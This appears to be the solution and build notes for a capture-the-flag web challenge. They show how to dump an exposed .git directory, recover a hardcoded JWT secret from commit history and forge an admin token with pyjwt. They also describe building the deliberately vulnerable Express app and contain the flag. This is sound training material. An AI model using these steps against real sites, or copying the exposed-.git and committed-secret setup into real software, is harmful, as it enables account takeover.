# Solution — Port Authority Pass

## Intended solve

1. **Recon the dashboard.** Hit the endpoint, register/login as a regular dock clerk, observe a JWT in the `Authorization: Bearer ...` header. Decode it on jwt.io: header `{"alg":"HS256","typ":"JWT"}`, payload `{"sub":"clerk_id", "is_harbormaster": false, ...}`. (~10 min)
2. **Probe `/admin/logbook`.** Hit it with the clerk's token — gets `403 Forbidden`. Confirms the role flag matters. (~3 min)
3. **Discover `.git/` exposure.** Try `/.git/HEAD` → returns `ref: refs/heads/main`. Confirms the entire `.git` directory is served. Tools: browser, `curl`. (~5 min)
4. **Dump the repo with git-dumper:**
   ```
   git-dumper https://<endpoint>/ ./recovered
   cd recovered
   git log --all -p | grep -i secret
   ```
   Tools: `git-dumper` (or manual fetch of `.git/objects/`), `git`. (~15 min)
5. **Find the secret in history.** A commit titled "remove debug constant" deleted a line `const JWT_SECRET = 'salt_marks_secret_2017';` from `app.js`. The secret is recoverable in the parent commit. (~5 min)
6. **Forge a Harbormaster token.** Use `pyjwt` or jwt.io with the recovered secret:
   ```
   import jwt
   token = jwt.encode({"sub":"forged","is_harbormaster":True,"exp":<future>}, "salt_marks_secret_2017", algorithm="HS256")
   ```
   (~5 min)
7. **Hit `/admin/logbook` with the forged token.** Banner reads `progctf{...}`. (~2 min)

## Total estimated time: 45–60 minutes

## Why this is Open Sea
- Two-stage chain: source-disclosure recon → secret recovery from git history → JWT forgery.
- Each step is a distinct technique (git-dumper / git archaeology / JWT forge with HS256).
- Off-the-shelf JWT crackers don't help unless the player has already recovered the secret.
- Beginner who knows JWT exists won't land this without the recon step.

## Implementer note
Powder Monkey: Express app with `/api/auth/login`, `/api/dashboard` (clerk-accessible), `/admin/logbook` (gated by `is_harbormaster:true` in the JWT). Init a real git repo at the deployment root with TWO commits: commit 1 includes `const JWT_SECRET = 'salt_marks_secret_2017';` in `app.js`; commit 2 reads the secret from `process.env.JWT_SECRET` and removes the constant. Serve `.git/` as static. Container env sets `JWT_SECRET=salt_marks_secret_2017`. Logbook banner: `progctf{never_commit_thy_secrets}`.

## Verification

`build/build.sh verify` ran on 2026-05-01 (no Docker required). Source layout:

```
src/
├── Dockerfile          — node:20.11.1-alpine multi-stage; non-root sailor (uid 10001)
├── app.js              — runtime app (HEAD/commit-2: reads JWT_SECRET from env)
├── package.json        — pinned: express 4.19.2, jsonwebtoken 9.0.2, body-parser 1.20.2
├── git_init.sh         — materializes the two-commit history at image-build time
├── entrypoint.sh       — `node /app/app.js` after asserting JWT_SECRET is set
└── .dockerignore
```

```
$ bash build/build.sh verify
[verify] checking source files exist...
[verify] checking the runtime app.js does NOT contain the literal secret...
[verify] checking git_init.sh embeds the literal secret in commit 1...
[verify] checking the flag is in the runtime app.js (admin/logbook banner)...
[verify] checking the flag is NOT in any commit-1 source...
[verify] OK — static checks pass
```

The `git_init.sh` script was independently exercised in `/tmp` against a host `git` 2.x. Output:

```
[git_init] HEAD is at:
fb5fcdc remove debug constant — read from env
3cf451c initial port-authority app.js
[git_init] verified: secret present in HEAD~1 (parent), absent from HEAD

# git show HEAD~1:app.js  | grep -c "salt_marks_secret_2017"  →  1
# git show HEAD:app.js    | grep -c "salt_marks_secret_2017"  →  0
```

So the deployed container ships:
- `/app/app.js` (commit-2 source, env-var version) as the running process
- `/app/.git/` (full real repo, 2 commits) reachable via `express.static(DEPLOY_ROOT, {dotfiles: "allow"})` — no listing prettifier; raw git pack/loose-object bytes
- `JWT_SECRET=salt_marks_secret_2017` in the container env, making the working server's HS256 verify use the same secret the player recovers from the parent commit's `app.js`

A real player flow:
1. `curl http://<host>/.git/HEAD` → `ref: refs/heads/main` (confirms `.git/` exposure)
2. `git-dumper http://<host>/ ./recovered`
3. `git -C recovered log --all -p | grep secret` → finds `const JWT_SECRET = 'salt_marks_secret_2017';` removed in commit 2
4. `pyjwt`-forge a token with `is_harbormaster: true` using the recovered HS256 secret
5. `curl -H "Authorization: Bearer <forged>" http://<host>/admin/logbook` → renders the harbormaster banner containing `progctf{never_commit_thy_secrets}`

**Anti-leak audit (static):**
- The flag `progctf{never_commit_thy_secrets}` appears ONLY in `src/app.js`'s `/admin/logbook` HTML banner. It is NOT in `git_init.sh` (so it never enters git history), NOT in any env var, NOT in any error response. Verified by build/build.sh `verify` step (`grep -q "progctf{" git_init.sh` would fail the build).
- The recovered HS256 secret `salt_marks_secret_2017` appears ONLY in `git_init.sh`'s commit-1 heredoc (so it lives in git history at HEAD~1) and in the container's runtime env at deploy time. NOT in the runtime app.js — verified by `verify` (`grep -q "salt_marks_secret_2017" src/app.js` would fail the build).

**Runtime verification:** DEFERRED — Docker daemon is not running on this Quartermaster host (same status as #27 ghost_fleets_supply_chain). All static and dependency checks pass; full `docker build` + `docker run` + end-to-end player walkthrough requires the daemon and is the responsibility of the staging deploy in Phase 4. Tracked alongside the existing `Runtime-verify #27` gap log entry.
